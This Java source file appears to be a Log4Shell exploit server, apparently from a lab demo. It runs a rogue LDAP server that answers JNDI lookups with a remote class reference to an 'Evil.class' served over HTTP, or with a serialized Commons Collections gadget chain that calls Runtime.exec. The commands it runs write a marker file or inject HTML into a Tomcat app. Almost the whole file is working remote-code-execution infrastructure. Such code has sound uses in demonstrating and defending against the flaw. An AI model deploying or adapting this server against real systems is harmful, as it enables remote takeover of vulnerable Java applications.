import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import io.undertow.Undertow;
import io.undertow.util.Headers;
import org.apache.commons.lang3.SerializationUtils;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.util.HashMap;
import java.util.Map;

public  class  Server  {
    private  static  final String LDAP_BASE = "dc=example,dc=com" ;
    private static String payloadClassname;
    public  static  void  main (String[] args) throws IOException, LDAPException {
        String[] defaultArgs = {"http://127.0.0.1:8000/#Evil", "9999", "8000", "Evil.class"};

        if (args.length != 4) {
            args = defaultArgs;
        }
        payloadClassname = args[3];

        setupLDAP(args[0], Integer.parseInt(args[1]));
        setupHTTP(Integer.parseInt(args[2]));
    }

    private static void setupLDAP(String evilUrl, int port)
        throws LDAPException, MalformedURLException, UnknownHostException
    {
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
            "listen" ,
            InetAddress.getByName( "0.0.0.0" ),
            port,
            ServerSocketFactory.getDefault(),
            SocketFactory.getDefault(),
            (SSLSocketFactory) SSLSocketFactory.getDefault()
        ));

        config.addInMemoryOperationInterceptor(new OperationInterceptor( new URL(evilUrl)));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println( "LDAP server listening on 0.0.0.0:" + port);
        ds.startListening();
    }

    private static void setupHTTP(int port) throws IOException {
        byte[] targetArray = readEvil();

        Undertow server = Undertow.builder()
            .addHttpListener(port, "0.0.0.0")

            // keep it simple - any request returns our Evil.class
            .setHandler(exchange -> {
                System.out.println("Send HTTP class byte array result");
                exchange.getResponseHeaders().put(Headers.CONTENT_TYPE, "application/octet-stream");
                exchange.getResponseSender().send(ByteBuffer.wrap(targetArray));
            }).build();

        System.out.println( "HTTP server listening on 0.0.0.0:" + port);
        server.start();
    }

    private static byte[] readEvil() throws IOException {
        InputStream is = Server.class.getClassLoader().getResourceAsStream(payloadClassname);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        int nRead;
        byte[] data = new byte[4];

        while ((nRead = is.read(data, 0, data.length)) != -1) {
            bos.write(data, 0, nRead);
        }

        bos.flush();
        return bos.toByteArray();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private final URL codebase;

        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry entry = new Entry(base);
            try {
                sendResult(result, base, entry);
            } catch (LDAPException | MalformedURLException e) {
                e.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e)
            throws LDAPException, MalformedURLException
        {
            System.out.println("Base = " + base);
           if (base.equals("Commons") || base.equals("Commons2")) {
                //deserialization attack chain in commons collections
                System.out.println("Send LDAP reference result for " + base + " containing a deserialized chain");

                String[] command = {
                        "/bin/sh",
                        "-c",
                        "echo PWNED > /tmp/pwned-commons"};

                if (base.equals("Commons2")) {
                    String[] containerCommand = {
                            "/bin/sh",
                            "-c",
                            "echo '<center><h1>This text is inserted using the Log4shell deserialization route with Commons Collection 3.1</h1></center>' >> /usr/local/tomcat/webapps/todolist/WEB-INF/views/common/header.jspf"};

                    command = containerCommand;
                }

                final Transformer[] transformers = new Transformer[] {
                        new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                        new InvokerTransformer("exec", new Class[] { String[].class }, new Object[] {command})
                };
                final Transformer transformerChain = new ChainedTransformer(transformers);

                final Map innerMap = new HashMap();
                final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
                TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

                e.addAttribute("javaClassName", "foo");
                e.addAttribute("javaSerializedData", SerializationUtils.serialize(entry));
                e.addAttribute("objectClass", "javaNamingReference");

                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } else {
               URL turl = new URL(
                       this.codebase, this.codebase.getRef().replace('.', '/').concat(".class")
               );
               System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
               e.addAttribute("javaClassName", "foo");
               String cbstring = this.codebase.toString();
               int refPos = cbstring.indexOf('#');
               if (refPos > 0) {
                   cbstring = cbstring.substring(0, refPos);
               }
               e.addAttribute("javaCodeBase", cbstring);
               e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
               e.addAttribute("javaFactory", this.codebase.getRef());
               result.sendSearchEntry(e);
               result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
           }
        }
    }
}
